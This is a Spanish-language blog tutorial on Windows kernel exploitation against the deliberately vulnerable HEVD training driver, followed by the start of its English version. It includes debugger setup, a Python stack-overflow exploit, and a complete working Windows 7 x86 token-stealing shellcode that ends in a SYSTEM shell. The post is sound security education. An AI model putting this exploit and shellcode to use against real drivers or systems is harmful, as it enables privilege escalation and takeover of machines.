Binary Exploitation: Este es un curso escrito por los creadores de RET2 publicada gratis. Con el permiso de los autores del curso, tambien publiqué mis notas en GitHub. Una vez más, esto es para sistemas más antiguos de Linux (x86), pero el conocimiento es transferible. Si prefieres algo más moderno, y puedes, te recomiendo estos cursos:\nCorelan Training: Corelan también ofrece cursos para systemas modernas. Así que si prefieres pagar, la clase de Expert Level Stack debería ser un comienzo sólido para explotación de Windows. Yo tomé su Heap Masterclass en 2019 y planeo tomarlo de nuevo. RET2 Wargames: RET2 Wargames es un curso que tomé y completé en 2024. No puedo decir lo suficiente, este curso lo recomiendo. Además, una vez completé el curso, me comuniqué con los autores del curso y me permitieron publicar mis notas sobre su antiguo curso MBE. Si esto no es suficiente para apoyarlos, yo escribí en mi experiencia \u0026gt;aqi\u0026lt; Que yo sepa, estos cursos son sólo en inglés. Sin embargo, sé que el lenguaje de programación es universal. Con eso, podemos comenzar!\nTable of Contents # Trabajando con el Kernel y WinDbg Preparando la Computadora Que Vamos a Atacar (Debugee) Configurando el Sistema de Virtualización Configurar la \u0026ldquo;host\u0026rdquo; Computadora (Debugger) Introducción a HEVD Trabajando con Conductores de Sistemas Trabajando con HEVD, Ghidra y WinDbg Explotación de un \u0026ldquo;Stack Overflow\u0026rdquo; (Windows 7 - x86) Identificando la Vulnerabilidad Entendiendo BufferOverflowStackIoctlHandler Entendiendo TriggerBufferOverflowStack Kernel Shellcode?? Arreglando el Choque Recursos Trabajando con el Kernel y WinDbg # Al leer este tutorial, es importante que reconozcas dos definiciones. Primero, la computadora donde vamos a estar trabajando se llama la host computer o debugger machine. Mientras, la computadora que vamos a depurar, se llama la target computer o debugee machine. El sistema debugee machine, estará dentro de un programa de virtualización.\nPreparando la Computadora Que Vamos a Atacar (Debugee) # Para empezar, encende el debugee machine y abre el \u0026ldquo;command prompt\u0026rdquo; con permisos de un administrador y ejecuta lo siguiente:\nC:\\Windows\\system32\u0026gt;bcdedit /copy {current} /d \u0026#34;Kernel Debugging On\u0026#34; The entry was successfully copied to {3709675a-4632-11ee-b00a-b3e46a698b2a}. C:\\Windows\\system32\u0026gt;bcdedit /debug {3709675a-4632-11ee-b00a-b3e46a698b2a} on The operation completed successfully. Esto generará una entrada en la \u0026ldquo;boot table\u0026rdquo; que tiene la habilitada de depuración (debug). Nosotras podemos confirmar esto ejecutando bcdedit.\nDespués de crear la entrada (ahora tiene la habilidad de depurar o \u0026ldquo;debug\u0026rdquo;), abre la aplicación System Configuration. Una vez lo has abierto, ve a la pestaña de Boot. Clicia en la entrada recién agregada y clickia Advanced Options.... Después copia los ajustes como demuestro aqi (yo usé \u0026ldquo;COM2\u0026rdquo;). Es importante que el \u0026ldquo;baud rate\u0026rdquo; está sincronizado con el host computer que configuraremos para ser 115200.\nClickia OK, Apply, OK, después encender y apaga el sistema de virtualización (VM).\nConfigurando el Sistema de Virtualización # Apaga el VM, después ábre la configuración de el VM y agregar un \u0026ldquo;Serial Port\u0026rdquo;, una vez añadido, utilice la configuración presentada aquí:\nLa próxima vez que lo arranques, clicia la nueva entrada; sin embargo ahora podemos pasar al siguiente paso.\nConfigurar la \u0026ldquo;host\u0026rdquo; Computadora (Debugger) # Suponiendo que la target computer fue configurada correctamente, abre el WinDbg apropiado, en mi caso WinDbg (x64). Una vez abierto, clicia File y Kernel Debug....\nUna vez lo as seleccionado, una ventana se va abrir, vete a la pestaña COM y escribir lo siguiente (cómo programaste tu configuración):\nLuego presiona \u0026ldquo;OK\u0026rdquo;. Si no lo has hecho, arrancar la computadora que vas atacar y una vez que hayamos entrado a la nueva entrada que creamos antes, deberías ver lo siguiente:\nPon te orgulloso, as configurado tu primer \u0026ldquo;Kernel Debugger\u0026rdquo;! Ahora\u0026hellip; como ejercicio, hazlo de nuevo en Windows 7.\nIntroducción a HEVD # Has aprendido como configurar \u0026ldquo;kernel debugging\u0026rdquo;, con eso, confirmar que as bajado HEVD, OSRLOADER, y Python a el target computer or debugee machine.\nLa primera ves que abres HEVD, vas a ejecutar OSRLOADER.exe, asegúrete ejecutarlo como administrador. Deberías ver lo siguiente:\nUna vez ejecutado, clicia Browse y ve al HEVD conductor adecuado y abre lo.\nEn orden para asegurar que el conductor se va ejecutar cuando arrancamos la computadora, selecciona \u0026ldquo;Automatic\u0026rdquo; de la pestaña de la configuración \u0026ldquo;Service Start\u0026rdquo;. Deberías ver lo siguiente:\nVolviendo a nuestro debugger, si pausas ejecución y listas los módulos cargados, deberías ver HEVD.\nLo siguiente que debemos hacer es arreglar los simbolos.\nToma nota del camino: C:\\projects\\hevd\\build\\driver\\vulnerable\\x86\\HEVD\\HEVD.pdb necesitaremos crear lo en el host computer, y copiar todos los documentos a el como demostrado aqi:\nDespués, enciende y apaga la máquina. Si todo salio bien, deberías ver lo siguiente:\nTrabajando con Conductores de Sistemas # Conductores de sistemas o \u0026ldquo;Device Drivers\u0026rdquo; son objetos de el Kernel, lo que significa esto es que no podemos modificarlos directamente desde Userland. Para interactuar con los conductores, nosotros necesitamos un HANDLE para ellos. Para hacer esto, necesitamos usar un enlace simbólico como \\\\Driver y pasar lo a CreateFileA.\nUna vez que hayamos obtenido un \u0026ldquo;handle\u0026rdquo;, podemos usar la función DeviceIoControl para obtener control sobre los aparatos a través de el entrada y salida (I/O) sobre el interfaz (IOCTL). Esta interfaz, puede mandar códigos de control a el aparato, cada código de control representa una operación para que el aparato lo pueda ejecutar. Por ejemplo, un código de control le puede preguntar el aparato que ejecutar una acción como borrando el disco.\nAte mirar dónde podemos encontrar la información necesaria para realizar estas llamadas dentro de HEVD.\nTrabajando con HEVD, Ghidra y WinDbg # Si cargamos HEVD.sys adentro de ghidra nosotros podemos ver el entry point de el aparato en realidad comienza en DriverEntry(). Esta función es la primera rutina llamado cuando el aparato esta cargado y tiene la responsabilidad de inicializando el aparato.\nSi entramos en esta función, todo se vuelve más claro.\nUsemos WinDbg para ver esto, encienda y apague la máquina y pon un pausa en en el punto de entrada antes que el aparato este cargado. Deberías yegar al pausa.\nSi continúas a desmontar desde aqi (u), eventualmente deberías ver una yamada a IoCreateSymbolicLink.\nEsta función esta responsable de crear el enlace simbólico que nosotras podemos llamar de Userland.\nSi imprimimos el primer argumento, podemos ver el nombre del enlace simbólico. En este caso va ser HackSysExtremeVulnerableDriver.\nNosotras podemos ignorar \\\\DosDevices este es un espacio especial de nombre que Windows usa para el aparato. Para interactuar con él vamos usar \\\\.\\HackSysExtremeVulnerableDriver, usamos \\\\.\\ porque esto es en el espacio \u0026ldquo;Win32 device namespace\u0026rdquo; o \u0026ldquo;raw devive namespace\u0026rdquo; que podemos usar desde userland. Aunque no necesitábamos pasar por esto, quería ver qué argumentos se pasarían a la función cuando creando un enlace simbólico.\nEntonces, ¿cómo enviamos información a HEVD? Como mencioné anteriormente, vamos usar DeviceIoControl.\nLo principal en lo que queremos concentrarnos es el dwIoControlCode\nEsto sera la operación que nosotros queremos el aprato que ejecute. Estos operacións o solicitudes son mandados al aparato por un I/O paquete también conocido como IRPs.\nMirando la descompilación en Ghidra en línea 31 miramos que param_1-\u0026gt;MajorFunction[0xe] esta establecido con IrpDeviceIoCtlHandler. Por qué? Si miramos MSDN vemos la definición de estructura para este objeto en particular (__DRIVER_OBJECT).\nA poner esto indica que IrpDeviceIoCtlHandler será la \u0026ldquo;función\u0026rdquo; que controla cómo interactuar con el aprato. Esto lo sabemos por el \u0026ldquo;IRP Major Function Code 0xE\u0026rdquo; (Mira esto como la función principal \u0026ldquo;main\u0026rdquo;):\nSi abres IrpDeviceIoCtlHandler sobre Ghidra se nos presenta la descompilación de la función. Aquí vemos que HEVD usa un \u0026ldquo;switch\u0026rdquo; para manejar nuestro mensajes de I/O.\nCon eso, tenemos todo lo que necesitamos para comenzar Exploit Development.\nExplotación de un \u0026ldquo;Stack Overflow\u0026rdquo; (Windows 7 - x86) # Para facilitar las cosas, ¿por qué no empezar con una vulnerabilidad tradicional? Un \u0026ldquo;buffer overflow\u0026rdquo;. Para ser las cosas mas facil tambien vamos usar python. Sin embargo, tenga en cuenta que más adelante en esta serie vamos usar C y tal vez C++.\nIdentificando la Vulnerabilidad # Ya que tenemos símbolos ingeniería inversa será facil. Dentro IrpDeviceIoCtlHandler podemos ver el \u0026ldquo;stack overflow\u0026rdquo; puede ser activado a través de el codigo I/O 0x222003.\nSi entramos a la función BufferOverflowStackIoctlHandler.\nHacemos una yamada a TriggerBufferOverflowStack.\nHagamos nuestro prueba de concepto (PoC) para ver que pasa cuando entramos en esta función.\nimport struct import os from ctypes import * GENERIC_READ = 0x80000000 GENERIC_WRITE = 0x40000000 OPEN_EXISTING = 0x00000003 FILE_ATTRIBUTE_NORMAL = 0x00000080 NULL = None def main(): kernel32 = windll.kernel32 hHEVD = kernel32.CreateFileA(b\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL) if (hHEVD == -1): print(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;) exit(-1) buffer = \u0026#34;wetw0rk\u0026#34; print(\u0026#34;[*] Calling control code 0x222003\u0026#34;) kernel32.DeviceIoControl(hHEVD, 0x222003, buffer, len(buffer), NULL, 0x00, byref(c_ulong()), NULL) main() Entendiendo BufferOverflowStackIoctlHandler # Establecer una pausa en BufferOverflowStackIoctlHandler.\nIntentemos ver qué se pasa a esta función, podemos empesar bajando el \u0026ldquo;stack frame\u0026rdquo;.\nMirando BufferOverflowStackIoctlHandler dentro Ghidra nos dice que estos parámetros son de tipo _IRP y _IO_STACK_LOCATION (también vimos esto en el \u0026ldquo;stack frame\u0026rdquo; con WinDbg).\nSin embargo, en realidad sólo estamos usando param_2 de el tipo _IO_STACK_LOCATION.\nPodemos encontrar la definición de esta estructura usando la documentación de MS, sin embargo es largo, entonces solo lo relevante para nosotros esta enseñado.\ntypedef struct _IO_STACK_LOCATION { UCHAR MajorFunction; UCHAR MinorFunction; UCHAR Flags; UCHAR Control; union { ... struct { ULONG OutputBufferLength; ULONG POINTER_ALIGNMENT InputBufferLength; ULONG POINTER_ALIGNMENT FsControlCode; PVOID Type3InputBuffer; } FileSystemControl; ... } Parameters; PDEVICE_OBJECT DeviceObject; PFILE_OBJECT FileObject; PIO_COMPLETION_ROUTINE CompletionRoutine; PVOID Context; } IO_STACK_LOCATION, *PIO_STACK_LOCATION; Si miramos esto en WinDbg, miramos que (param_2-\u0026gt;Parameters).FileSystemControl.Type3InputBuffer es el puntero a nuestro porción de memoria (\u0026ldquo;buffer\u0026rdquo;).\nEntonces, cuando entramos a TriggerBufferOverflowStack, podemos estar seguros de que nuestra información esta pasado como param_1.\nEntendiendo TriggerBufferOverflowStack # Ahora que entendimos que param_1 de TriggerBufferOverflowStack contiene nuestra memoria, la explotación parece fácil\nSimplemente tenemos que mandar mas de 2060 \u0026ldquo;bytes\u0026rdquo; y deberíamos tener curropción de la memoria! Agregar los cambios al PoC y mando lo!\nimport struct import os from ctypes import * GENERIC_READ = 0x80000000 GENERIC_WRITE = 0x40000000 OPEN_EXISTING = 0x00000003 FILE_ATTRIBUTE_NORMAL = 0x00000080 NULL = None def main(): kernel32 = windll.kernel32 hHEVD = kernel32.CreateFileA(b\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL) if (hHEVD == -1): print(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;) exit(-1) buffer = b\u0026#34;A\u0026#34; * 3000 print(\u0026#34;[*] Calling control code 0x222003\u0026#34;) kernel32.DeviceIoControl(hHEVD, 0x222003, buffer, len(buffer), NULL, 0x00, byref(c_ulong()), NULL) main() Una vez enviado, podemos ver que hemos sobrescrito una dirección que utiliza la computadora para regresar y hemos ganado control sobre el puntero de instrucción (EIP).\nKernel Shellcode?? # Entonces tenemos control sobre el puntero de las instrucciones, y tenemos un conocimiento sólido de cómo. Una pregunta falta, ¿cómo podemos manipular código para ejecutar? Es mas, cómo podemos crear un \u0026ldquo;shell\u0026rdquo; de \u0026ldquo;SYSTEM\u0026rdquo;?\nVamos a necesitar shellcode, sin embargo, no podemos usar cualquier shellcode. Como estamos corriendo bajo el contexto de el Kernel, un paso equivocado resulta en una pantalla de muerte azul (BSOD). Para alcanzar nuestro objetivo, utilizaremos una técnica conocida como Token Stealing. Usando esta técnica, copiaremos un token con privilegios a nuestro proceso.\nPor suerte para nosotros, HEVD viene con copias de Payloads incluyendo este. Echemos una mirada a Payloads.c dentro del repositro.\n186 VOID TokenStealingPayloadWin7Generic() { 187 // No Need of Kernel Recovery as we are not corrupting anything 188 __asm { 189 pushad ; Save registers state 190 191 ; Start of Token Stealing Stub 192 xor eax, eax ; Set ZERO 193 mov eax, fs:[eax + KTHREAD_OFFSET] ; Get nt!_KPCR.PcrbData.CurrentThread 194 ; _KTHREAD is located at FS:[0x124] 195 196 mov eax, [eax + EPROCESS_OFFSET] ; Get nt!_KTHREAD.ApcState.Process 197 198 mov ecx, eax ; Copy current process _EPROCESS structure 199 200 mov edx, SYSTEM_PID ; WIN 7 SP1 SYSTEM process PID = 0x4 201 202 SearchSystemPID: 203 mov eax, [eax + FLINK_OFFSET] ; Get nt!_EPROCESS.ActiveProcessLinks.Flink 204 sub eax, FLINK_OFFSET 205 cmp [eax + PID_OFFSET], edx ; Get nt!_EPROCESS.UniqueProcessId 206 jne SearchSystemPID 207 208 mov edx, [eax + TOKEN_OFFSET] ; Get SYSTEM process nt!_EPROCESS.Token 209 mov [ecx + TOKEN_OFFSET], edx ; Replace target process nt!_EPROCESS.Token 210 ; with SYSTEM process nt!_EPROCESS.Token 211 ; End of Token Stealing Stub 212 213 popad ; Restore registers state 214 } 215 } Vamos a dividir esto línea por línea. En línea 192 borramos el registro EAX. Después, en línea 193 usamos el registro FS para obtener la dirección del \u0026ldquo;current thread\u0026rdquo; ubicado desde la distancia 0x124. Podemos ver esto con WinDbg:\nVamos a mapear la estructura, primero necesitamos la dirección del el PCR (Processor Control Region), también conocido como el _KPCR desde allí podemos fácilmente iterar sobre la estructura y encontrar el \u0026ldquo;current thread\u0026rdquo;.\nDespués, necesitamos encontrar la dirección de la estructura _EPROCESS (\u0026ldquo;Executive Process\u0026rdquo;).\nCada proceso en ejecución en un los systemas de Windows esta asociado con un estructura de EPROCESS. Podemos hacer esto tal como hicimos el _KCPR.\nAhora veamos el siguiente bloque de código dentro de este \u0026ldquo;payload\u0026rdquo; (aqi siéntete libre de nomas leer porque en este punto comencé a escribir el código para Sickle):\nSearchSystemPID: mov eax, [eax + FLINK_OFFSET] ; Get nt!_EPROCESS.ActiveProcessLinks.Flink sub eax, FLINK_OFFSET cmp [eax + PID_OFFSET], edx ; Get nt!_EPROCESS.UniqueProcessId jne SearchSystemPID Aquí estamos extractado el puntero al forward link (FLINK) pointer desde el *_EPROCESS\u0026quot; corriente, luego restando la distancia al FLINK desde EAX para cambiar EAX para señalar el siguiente estructura _EPROCESS dentro del lista enlazada. Luego comparamos la identificación del proceso de la estructura _EPROCESS a 0x04 y si no se encuentra seguimos buscando hasta que encontramos el proceso de \u0026ldquo;SYSTEM\u0026rdquo;.\nUna vez que encontramos el proceso, simplemente reemplazamos nuestro token del proceso \u0026ldquo;SYSTEM\u0026rdquo;. Esto es casi como un cazador de huevos (\u0026ldquo;egghunter\u0026rdquo;) pero para los tokens.\nmov edx, [eax + TOKEN_OFFSET] ; Get SYSTEM process nt!_EPROCESS.Token mov [ecx + TOKEN_OFFSET], edx ; Replace target process nt!_EPROCESS.Token ; with SYSTEM process nt!_EPROCESS.Token El código se puede ver aqi:\n[BITS 32 ] [SECTION .text] global _start _start: pushad xor eax, eax ; set ZERO mov eax, dword fs:[eax+0x124] ; nt!_KPCR.PcrbData.CurrentThread mov eax, [eax + 0x50] ; nt!_KTHREAD.ApcState.Process mov ecx, eax ; Copy current process _EPROCESS structure mov edx, 0x04 ; WIN 10 SYSTEM PROCESS PID SearchSystemPID: mov eax, [eax + 0xb8] ; nt!_EPROCESS.ActiveProcessLinks.Flink sub eax, 0xb8 cmp [eax + 0xb4], edx ; nt!_EPROCESS.UniqueProcessId jne SearchSystemPID mov edx, [eax + 0xf8] ; Get SYSTEM process nt!_EPROCESS.Token mov [ecx + 0xf8], edx ; Replace target process nt!_EPROCESS.Token popad Veamos esto en el depurador (debugger), puedes generarlo usando Sickle.\n$ python3 sickle.py -p windows/x86/kernel_token_stealer -f python3 -v shellcode # Bytecode generated by Sickle, size: 52 bytes shellcode = bytearray() shellcode += b\u0026#39;\\x60\\x31\\xc0\\x64\\x8b\\x80\\x24\\x01\\x00\\x00\\x8b\\x40\\x50\\x89\u0026#39; shellcode += b\u0026#39;\\xc1\\xba\\x04\\x00\\x00\\x00\\x8b\\x80\\xb8\\x00\\x00\\x00\\x2d\\xb8\u0026#39; shellcode += b\u0026#39;\\x00\\x00\\x00\\x39\\x90\\xb4\\x00\\x00\\x00\\x75\\xed\\x8b\\x90\\xf8\u0026#39; shellcode += b\u0026#39;\\x00\\x00\\x00\\x89\\x91\\xf8\\x00\\x00\\x00\\x61\u0026#39; Realizar los cambios en el PoC como se demuestra aqi:\nimport struct import os from ctypes import * GENERIC_READ = 0x80000000 GENERIC_WRITE = 0x40000000 OPEN_EXISTING = 0x00000003 FILE_ATTRIBUTE_NORMAL = 0x00000080 MEM_COMMIT = 0x00001000 MEM_RESERVE = 0x00002000 PAGE_EXECUTE_READWRITE = 0x00000040 NULL = None def main(): kernel32 = windll.kernel32 hHEVD = kernel32.CreateFileA(b\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL) if (hHEVD == -1): print(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;) exit(-1) # python3 sickle.py -p windows/x86/kernel_token_stealer -f python3 -v shellcode # Bytecode generated by Sickle, size: 52 bytes shellcode = bytearray() shellcode += b\u0026#39;\\x60\\x31\\xc0\\x64\\x8b\\x80\\x24\\x01\\x00\\x00\\x8b\\x40\\x50\\x89\\xc1\u0026#39; shellcode += b\u0026#39;\\xba\\x04\\x00\\x00\\x00\\x8b\\x80\\xb8\\x00\\x00\\x00\\x2d\\xb8\\x00\\x00\u0026#39; shellcode += b\u0026#39;\\x00\\x39\\x90\\xb4\\x00\\x00\\x00\\x75\\xed\\x8b\\x90\\xf8\\x00\\x00\\x00\u0026#39; shellcode += b\u0026#39;\\x89\\x91\\xf8\\x00\\x00\\x00\\x61\u0026#39; print(\u0026#34;[*] Allocating RWX memory\u0026#34;) ptrMemory = kernel32.VirtualAlloc(NULL, len(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE) print(\u0026#34;[*] Creating a char array to house shellcode\u0026#34;) buffer = (c_char * len(shellcode)).from_buffer(shellcode) print(\u0026#34;[*] Copying shellcode array into RWX memory\u0026#34;) kernel32.RtlMoveMemory(c_int(ptrMemory), buffer, len(shellcode)) ptrShellcode = struct.pack(\u0026#34;\u0026lt;L\u0026#34;, ptrMemory) buffer = b\u0026#34;A\u0026#34; * 2080 buffer += ptrShellcode print(\u0026#34;[*] Calling control code 0x222003\u0026#34;) kernel32.DeviceIoControl(hHEVD, 0x222003, buffer, len(buffer), NULL, 0x00, byref(c_ulong()), NULL) os.system(\u0026#34;cmd.exe\u0026#34;) main() Como vamos a sobrescribir una dirección de regreso, hacer una pausa en BASE+DISTANCIA. Podemos obtener esto con Ghidra.\nAplicar esto a WinDbg.\nCon una pausa configurada, inicie el exploit a el \u0026ldquo;target machine\u0026rdquo;.\nUna vez que llegues a la pausa, podemos ver que estamos a punto de regresar a la región de memoria y ejecutar nuestro código / shellcode (52 \u0026ldquo;bytes\u0026rdquo;).\nEntremos en esto (t) hasta que la veamos mov edx, 0x04. Aqi ECX y EAX debe contener direcciones a _EPROCESS.\nLa siguiente instrucción mueve el FLINK a dentro de EAX.\nUna vez ejecutado, sub eax, 0xb8 se ejecuta (como estamos atravesando procesos activos).\nEsto efectivamente posiciona EAX a el comienzo de la proxima estructura _EPROCESS.\nEstablezcamos un punto de interrupción aqi y ate continuar la ejecución hasta el proceso _EPROCESS.UniqueProcessId es 0x04. Una vez encontrado podemos ver que el salto no se ejecutará!\nAhora el código simplemente copia el token en nuestra estructura _EPROCESS! Parece que estaba equivocada en el último par de notas esto se puede encontrar en el proceso de propiedad.\nEntonces la realidad es que no tenemos que mirar demasiado lejos una vez que tenemos el \u0026ldquo;current thread\u0026hellip;\u0026rdquo; Estaba confundido pero ahora tiene sentido. Puedes ver esto aqi:\nAhora podemos continuar ejecutando nuestro shellcode, pero nos estrellamos, ¿por qué?\nArreglando el Choque # Mirando el estado de los registros aparece que EBP todavía está corrupto. Sin embargo, lo más importante es que nunca regresaremos. Agreguemos una instrucción \u0026ldquo;ret\u0026rdquo; a el shellcode y poner una dirección válida sobre EBP y intentar otra vez.\n┌──(wetw0rk㉿kali)-[/opt/Sickle/src] └─$ python3 sickle.py -a x86 -m asm_shell -f c [*] ASM Shell loaded for x86 architecture sickle \u0026gt; a pop ebp \u0026#34;\\x5d\u0026#34; // pop ebp sickle \u0026gt; a ret \u0026#34;\\xc3\u0026#34; // ret Una vez que cambiamos el PoC y lo enviamos, todavía chocamos. Así que decidí mirar Ghidra, y puedes ver que la instrucción \u0026ldquo;ret\u0026rdquo; en realidad es RET 0x8. Vamos intentar de nuevo\u0026hellip;\nEl código final se puede ver aqi:\nimport struct import os from ctypes import * GENERIC_READ = 0x80000000 GENERIC_WRITE = 0x40000000 OPEN_EXISTING = 0x00000003 FILE_ATTRIBUTE_NORMAL = 0x00000080 MEM_COMMIT = 0x00001000 MEM_RESERVE = 0x00002000 PAGE_EXECUTE_READWRITE = 0x00000040 NULL = None def main(): kernel32 = windll.kernel32 hHEVD = kernel32.CreateFileA(b\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL) if (hHEVD == -1): print(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;) exit(-1) shellcode = bytearray() # python3 sickle.py -a x86 -v shellcode -p windows/x86/kernel_token_stealer -f python3 -m pinpoint shellcode += b\u0026#39;\\x60\u0026#39; # pushal shellcode += b\u0026#39;\\x31\\xc0\u0026#39; # xor eax, eax shellcode += b\u0026#39;\\x64\\x8b\\x80\\x24\\x01\\x00\\x00\u0026#39; # mov eax, dword ptr fs:[eax + 0x124] shellcode += b\u0026#39;\\x8b\\x40\\x50\u0026#39; # mov eax, dword ptr [eax + 0x50] shellcode += b\u0026#39;\\x89\\xc1\u0026#39; # mov ecx, eax shellcode += b\u0026#39;\\xba\\x04\\x00\\x00\\x00\u0026#39; # mov edx, 4 shellcode += b\u0026#39;\\x8b\\x80\\xb8\\x00\\x00\\x00\u0026#39; # mov eax, dword ptr [eax + 0xb8] shellcode += b\u0026#39;\\x2d\\xb8\\x00\\x00\\x00\u0026#39; # sub eax, 0xb8 shellcode += b\u0026#39;\\x39\\x90\\xb4\\x00\\x00\\x00\u0026#39; # cmp dword ptr [eax + 0xb4], edx shellcode += b\u0026#39;\\x75\\xed\u0026#39; # jne 0x1014 shellcode += b\u0026#39;\\x8b\\x90\\xf8\\x00\\x00\\x00\u0026#39; # mov edx, dword ptr [eax + 0xf8] shellcode += b\u0026#39;\\x89\\x91\\xf8\\x00\\x00\\x00\u0026#39; # mov dword ptr [ecx + 0xf8], edx shellcode += b\u0026#39;\\x61\u0026#39; # popal shellcode += b\u0026#39;\\x5D\u0026#39; # pop ebp shellcode += b\u0026#39;\\xC2\\x08\\x00\u0026#39; # ret 0x8 print(\u0026#34;[*] Allocating RWX memory\u0026#34;) ptrMemory = kernel32.VirtualAlloc(NULL, len(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE) print(\u0026#34;[*] Creating a char array to house shellcode\u0026#34;) buffer = (c_char * len(shellcode)).from_buffer(shellcode) print(\u0026#34;[*] Copying shellcode array into RWX memory\u0026#34;) kernel32.RtlMoveMemory(c_int(ptrMemory), buffer, len(shellcode)) ptrShellcode = struct.pack(\u0026#34;\u0026lt;L\u0026#34;, ptrMemory) buffer = b\u0026#34;A\u0026#34; * 2080 buffer += ptrShellcode print(\u0026#34;[*] Calling control code 0x222003\\n\u0026#34;) kernel32.DeviceIoControl(hHEVD, 0x222003, buffer, len(buffer), NULL, 0x00, byref(c_ulong()), NULL) os.system(\u0026#34;cmd.exe\u0026#34;) main() Una vez que lo enviemos, somos \u0026ldquo;SYSTEM\u0026rdquo;!\nRecursos # https://www.welivesecurity.com/2017/03/27/configure-windbg-kernel-debugging/ https://microsoft.public.windbg.narkive.com/MamhR9YH/win7-and-kpcr https://github.com/LordNoteworthy/windows-internals/blob/master/IRP%20Major%20Functions%20List.md https://youtu.be/Ca3dAXDdoz8?si=oN_DsgyLz-Z4fVYL ","date":"1 December 2024","externalUrl":null,"permalink":"/posts/0x00-introducci%C3%B3n-a-windows-kernel-explotaci%C3%B3n/","section":"Posts","summary":"","title":"0x00 - Introducción a Windows Kernel Explotación","type":"posts"},{"content":" ₍₍ (ง ˙ω˙)ว ⁾⁾ Hablas Español? Empújame! This post will be the first of many in which I present you with a guide into the world of Windows Kernel Exploitation. As with anything in life, you must start somewhere and although we will be focusing on Windows 7 (x86) and Windows 10 (x64) for this post; we will ultimately be working our way up to Windows 11 (x64).\nTo get started, for this post you will need:\nVirtualization Software: This can be anything from VirtualBox to VMWare. I will leave it up to you which virtualization software you decide to use. WinDbg: This will serve as our debugger when working with the kernel, it\u0026rsquo;s important you download it from the Windows Driver Kit and NOT use WinDbg Preview for this series. HEVD: For this tutorial series I will be using HEVD v3.00, at the time of writing this is the latest version. HEVD stands for Hack Sys Extreme Vulnerable Driver, and it will serve as our target for this series. OSRLOADER: Since HEVD is a driver, we need a way to load it onto the operating system, to do this I will be using the OSRLOADER application. Python: At the time of writing this, I was using version 3.11.5 however any version should be ok. Ghidra: Ghidra will serve as our reverse engineering platform. If you have a copy of IDA Pro, you are more than welcome to adapt this series to use it :) Sickle: This will be the payload development framework we will use for opcode generation as well as our token stealing shellcode. If you\u0026rsquo;re reading this in 2024 more than likely the new release is not out so you will have to use the latest branch NOT the latest release (aka just clone the repo). It is important to note I have structured these guides for you to go from Exploit Developer to Kernel Exploit Developer. If you have never written a ROP chain or are completely unfamiliar with modern memory protections, I heavily recommend you start with Userland exploitation.\nIf you’re tight on cash and are looking for free resources I highly recommend the following:\nCorelan Tutorials: Corelan was one of my biggest inspirations in making these blog posts. When I first started my journey into Exploit Development I read Corelan tutorials 1-11. I believe the content that is presented in them is still relevant to this day. Do not let the lack of modern operating systems used in this free series deter you. Concepts such as Egg Hunters work on Windows 11 just as well as they did for Windows XP. Modern Binary Exploitation: This is a free course written by founders of RET2. With permission of the course authors, I have released my notes on my GitHub which you can use to follow along the slides. Once again, although this subject matter targets Linux x86 it is easily transferable to Windows. If you currently work for an employer or are fortunate enough to choose your training I highly reccomend the following:\nCorelan Training: Corelan offers updated training for the modern Windows environment so if you would prefer updated content his Expert Level Stack course should provide a solid foundation for Windows Exploit Development. I personally have taken his Heap Masterclass in 2019 and in the future I plan to attend again. RET2 Wargames: RET2 Wargames is a course I took and completed in 2024 and I cannot emphasis enough how much it has impacted me. In addition, after completion I contacted the course authors, and they let me release my MBE notes free. If this is not enough to make you want to support them, I don’t know what is. I have also written an in-depth review, if you would like to learn more: \u0026gt;here\u0026lt;. As of writing this post, I AM NOT sponsored by RET2 or Corelan. I truly believe in the course authors and if you do a little research, if you can’t now; in the future you will want to support them.\nWith that, we\u0026rsquo;re ready to get started!\nTable of Contents # Kernel Debugging with WinDbg Configuring Target Computer (Debugee) Virtual Machine Settings Configuring Host Computer (Debugger) Introduction to HEVD Working with Device Drivers Working with HEVD, Ghidra and WinDbg Stack Overflow (Windows 7 - x86) Identifying the Vulnerability Understanding BufferOverflowStackIoctlHandler Understanding TriggerBufferOverflowStack Kernel Shellcode?? Fixing The Crash Sources Kernel Debugging with WinDbg # When reading this tutorial, it\u0026rsquo;s important to recognize two definitions. Firstly, the computer that we will be working from is called the host computer or debugger machine. Whereas the computer that is being debugged, is called the target computer or debugee machine. We will be running our debugee as a virtual machine.\nConfiguring Target Computer (Debugee) # To begin, power on the debugee virtual machine and open an administrative command prompt and enter the following commands.\nC:\\Windows\\system32\u0026gt;bcdedit /copy {current} /d \u0026#34;Kernel Debugging On\u0026#34; The entry was successfully copied to {3709675a-4632-11ee-b00a-b3e46a698b2a}. C:\\Windows\\system32\u0026gt;bcdedit /debug {3709675a-4632-11ee-b00a-b3e46a698b2a} on The operation completed successfully. The commands above will generate an entry in the boot table with debugging enabled. We can confirm this by running bcdedit on its own.\nAfter creating the boot entry (now with debugging enabled), go ahead and launch the System Configuration app. Once opened navigate to the Boot tab. Select your newly added entry and hit Advanced Options.... Then copy the settings as shown below (I used COM2). It\u0026rsquo;s important the baud rate is synced with the host computer which we will configure to be 115200.\nHit OK, Apply, OK, then restart the Virtual Machine (VM).\nVirtual Machine Settings # Power off the VM, then open VM settings and add a Serial Port. Once added use the settings as shown below:\nNext time you boot in select the newly added entry as shown below; however we can now move onto the next step.\nConfiguring Host Computer (Debugger) # Assuming that the target computer was configured open the appropriate WinDbg in my case WinDbg (X64). 